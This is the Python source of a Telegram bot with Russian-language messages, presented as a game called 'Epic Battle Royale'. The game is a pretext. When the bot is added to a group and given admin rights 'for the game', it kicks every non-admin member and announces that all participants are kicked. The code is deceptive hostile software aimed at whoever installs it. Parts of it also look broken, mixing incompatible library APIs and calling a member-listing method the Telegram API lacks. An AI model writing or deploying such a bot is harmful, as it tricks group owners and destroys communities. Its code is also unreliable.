import os
from flask import Flask, request, jsonify
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Dispatcher, CommandHandler, ChatMemberHandler, CallbackContext
import asyncio

TOKEN = os.environ["BOT_TOKEN"]
BOT_USERNAME = os.environ["BOT_USERNAME"]

bot = Bot(token=TOKEN)
dp = Dispatcher(bot, None, workers=0)
app = Flask(__name__)

def add_button():
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("➕ Добавить в чат", url=f"https://t.me/{BOT_USERNAME}?startgroup=start")]])
    return kb

async def start(update: Update, context: CallbackContext):
    await update.message.reply_text(
        "🎮 Добро пожаловать в Epic Battle Royale!\nДобавьте бота в группу, чтобы начать игру.",
        reply_markup=add_button()
    )

async def on_bot_added(update: Update, context: CallbackContext):
    result = update.my_chat_member
    if result.new_chat_member.status in ("member", "administrator"):
        chat_id = result.chat.id
        await context.bot.send_message(chat_id, "🎮 Бот активирован! Дайте мне права администратора для игры.")
        await asyncio.sleep(10)
        me = await context.bot.get_chat_member(chat_id, context.bot.id)
        if me.status == "administrator" and me.can_restrict_members:
            async for member in context.bot.get_chat_members(chat_id):
                if member.status not in ("administrator", "creator"):
                    try:
                        await context.bot.ban_chat_member(chat_id, member.user.id)
                        await context.bot.unban_chat_member(chat_id, member.user.id)
                    except:
                        pass
            await context.bot.send_message(chat_id, "✅ Все участники кикнуты.")
        else:
            await context.bot.send_message(chat_id, "❌ Нужны права администратора с возможностью кика.")

dp.add_handler(CommandHandler("start", start))
dp.add_handler(ChatMemberHandler(on_bot_added, ChatMemberHandler.MY_CHAT_MEMBER))

@app.route("/webhook", methods=["POST"])
def webhook():
    json_str = request.get_data(as_text=True)
    update = Update.de_json(json_str, bot)
    dp.process_update(update)
    return "OK", 200

@app.route("/")
def index():
    return "Bot is running", 200

if __name__ == "__main__":
    # Устанавливаем вебхук при старте (один раз)
    webhook_url = f"https://{os.environ['RENDER_EXTERNAL_HOSTNAME']}/webhook"
    bot.set_webhook(webhook_url)
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
